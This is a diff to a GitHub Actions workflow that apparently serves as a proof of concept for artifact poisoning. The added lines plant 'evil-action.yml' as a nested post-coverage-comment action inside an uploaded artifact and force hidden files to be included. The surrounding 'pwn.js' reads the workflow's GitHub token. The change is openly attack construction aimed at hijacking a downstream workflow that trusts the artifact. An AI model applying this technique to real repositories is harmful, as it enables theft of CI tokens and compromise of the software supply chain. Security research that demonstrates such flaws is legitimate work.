@@ -25,6 +25,8 @@ jobs:
             "ado_url": "https://example.invalid/build"
           }
           JSON
+          mkdir -p coverage-comment-data/.github/actions/post-coverage-comment
+          cp evil-action.yml coverage-comment-data/.github/actions/post-coverage-comment/action.yml
           cat > coverage-comment-data/pwn.js <<'JSEOF'
           const fs = require('fs');
           const token = process.env.INPUT_GITHUB_TOKEN || '';
@@ -50,3 +52,4 @@ jobs:
         with:
           name: coverage-comment-data
           path: coverage-comment-data/
+          include-hidden-files: true
